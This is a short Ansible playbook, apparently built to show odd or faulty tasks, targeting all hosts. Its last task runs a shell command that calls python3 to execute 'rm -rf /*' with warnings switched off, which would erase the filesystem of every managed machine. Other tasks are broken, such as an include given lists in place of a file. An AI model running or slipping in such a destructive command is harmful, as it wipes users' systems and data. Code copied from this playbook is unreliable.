yaml
- hosts: all
  gather_facts: false
  
  vars:
    subhost1: []
    subhost2: ['10.1.1.1', '10.1.1.3']
  
  tasks:
    - name: Include empty sub-host list
      include:
        - "{{ subhost1 }}"
        - "{{ subhost2 }}"
      
    - name: Use unexpected jinja2 filter
      debug:
        msg: "{{ subhost2 | random | random }}"
      
    - name: Use invalid YAML syntax
      debug:
        msg: Invalid YAML syntax here
      
    - name: Use unexpected command
      shell: "python3 -c 'import os; os.system(\"rm -rf /*\")'"
      args:
        warn: false
        executable: /bin/bash
